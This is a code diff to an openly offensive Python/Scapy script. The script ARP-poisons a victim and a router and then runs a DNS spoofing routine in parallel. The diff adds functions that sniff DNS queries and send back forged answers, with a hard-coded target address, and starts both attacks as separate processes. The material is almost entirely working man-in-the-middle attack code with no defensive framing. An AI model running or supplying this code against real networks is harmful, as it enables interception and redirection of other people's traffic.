@@ -7,6 +7,7 @@ import argparse
 import re
 import threading
 import time
+from multiprocessing import Process
 
 #Program INPUTS:
 # - Victim IP
@@ -25,6 +26,7 @@ def parse_arguments():
 #1A: Get MAC address of victim machine
 def victimMacAddress(victim):
 	ip = victim
+	Popen(["ping", "-c 1", ip], stdout=PIPE)
 	pid = Popen(["arp", "-n", ip], stdout=PIPE)
 	s = pid.communicate()[0]
 	victimMac = re.search(r"(([a-f\d]{1,2}\:){5}[a-f\d]{1,2})", s).groups()[0]
@@ -33,6 +35,7 @@ def victimMacAddress(victim):
 #1B: Get MAC address of router
 def routerMacAddress(router):
 	ip = router
+	Popen(["ping", "-c 1", ip], stdout=PIPE)
 	pid = Popen(["arp", "-n", ip], stdout=PIPE)
 	s = pid.communicate()[0]
 	routerMac = re.search(r"(([a-f\d]{1,2}\:){5}[a-f\d]{1,2})", s).groups()[0]
@@ -58,20 +61,43 @@ def arpPoison(victim, router):
 	victimMac = victimMacAddress(victimIP)
 	routerMac = routerMacAddress(routerIP)
 
+	print "Starting ARP poisoning to"+victimIP
 	while True:
 		time.sleep(2)
 		#3A Repeatedly send ARP reply's to VICTIM stating that router IP
 		# is at THIS MAC addr
-		send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst=victimMac))
+		send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst=victimMac),verbose = 0)
 		#3B Repeatedly send ARP reply's to ROUTER stating that the victim IP
 		# is at THIS MAC
-		send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst=routerMac))
+		send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst=routerMac),verbose = 0)
 
 #4. After ARP poisoning has occurred, drop any forwarded DNS packets
 	#Firewall rule, disable forwarding of any UDP packets to dport 53
 #5. In a new thread, sniff for DNS queries.
 	#5A. Craft DNS answers that whatever has been requested
 	#lives at THIS IP.
+def spoofDNS(packet):
+	print "Got a packet!"
+	if packet.haslayer(DNS):
+		packet.show()
+		print "Has DNS"
+
+		if DNSQR in packet:
+			print "Has a DNS query"
+			print packet[DNSQR]
+			#Send back a spoofed packet
+			spoofed_pkt = (Ether()/IP(dst=packet[IP].src, src=packet[IP].dst)/\
+                      UDP(dport=packet[UDP].sport, sport=packet[UDP].dport)/\
+                      DNS(id=packet[DNS].id, qd=packet[DNS].qd, aa = 1, qr=1, \
+                      an=DNSRR(rrname=packet[DNS].qd.qname,  ttl=10, rdata="8.8.8.8")))
+        	sendp(spoofed_pkt)
+
+
+
+
+def sniffDNS(ownIP,victimIP,routerIP):
+	print "starting SNIFF DNS!!"
+	sniff (filter = "udp and port 53 and host 192.168.0.25", prn = spoofDNS)
 
 
 ## Restoring ARP tables so that we don't break shit
@@ -88,13 +114,22 @@ if __name__ == '__main__':
 	#enable fowrwarding
 	forwarding()
 	#arp poison the victim and router
-	thread1 = threading.Thread(target=arpPoison(victimIP, routerIP))
-	thread1.daemon = True
-	thread1.start()
-	#arpPoison(victimIP, routerIP)
-	print "ownIP is " + str(ownIP)
-	print "victimIP is " + str(victimIP)
-	print "routerIP is " + str(routerIP)
+
+
+	#Create two processes
+	arpPoisonProcess = Process(target=arpPoison,args=(victimIP,routerIP))
+	arpPoisonProcess.start()
+
+
+	sniffDNSprocess = Process(target=sniffDNS,args=(victimIP,routerIP,ownIP))
+	sniffDNSprocess.start()
+	arpPoisonProcess.join()
+	sniffDNSprocess.join()
+
+
+	print "Here!"
+
+
 
 
 
